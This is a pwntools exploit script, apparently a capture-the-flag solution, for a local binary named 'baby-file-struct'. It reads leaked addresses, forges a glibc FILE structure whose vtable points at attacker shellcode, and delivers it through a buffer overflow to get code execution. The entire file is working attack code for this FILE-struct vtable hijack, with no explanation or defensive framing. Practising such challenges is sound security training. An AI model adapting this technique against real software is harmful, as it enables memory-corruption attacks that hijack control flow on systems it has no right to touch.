#!/usr/bin/env python
from pwn import *
from pwnlib.filepointer import *

elf = ELF('./baby-file-struct')
libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
p = process("./baby-file-struct", env={'LD_PRELOAD': libc_file})

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
gdb.attach(p, 'init-gef')

p.recvuntil("shellcode: ")
shellcode_addr = int(p.recvline().decode().strip(), 16)
print(f"shellcode_addr: {hex(shellcode_addr)}")

p.recvuntil("shellcode2: ")
shellcode2_addr = int(p.recvline().decode().strip(), 16)
print(f"shellcode2_addr: {hex(shellcode2_addr)}")

p.recvuntil("challenge.buf: ")
buf_addr = int(p.recvline().decode().strip(), 16)
print(f"buf_addr: {hex(buf_addr)}")

p.recvuntil("challenge.fp: ")
fp_addr = int(p.recvline().decode().strip(), 16)
print(f"fp_addr: {hex(fp_addr)}")

lock_offset = 0x0
file_struct_offset = 0x10
vtable_offset = 0x110
fake_file = FileStructure(null=0xdeadbeef)
fake_file.vtable = buf_addr + vtable_offset
fake_file._lock = buf_addr + lock_offset

p.sendlineafter("bof: ", flat({
        0x0: b'A' * 0x10, # lock
        0x10: bytes(fake_file),
        vtable_offset: p64(shellcode_addr),
        0x200: p64(buf_addr + file_struct_offset),
    }))
p.interactive()
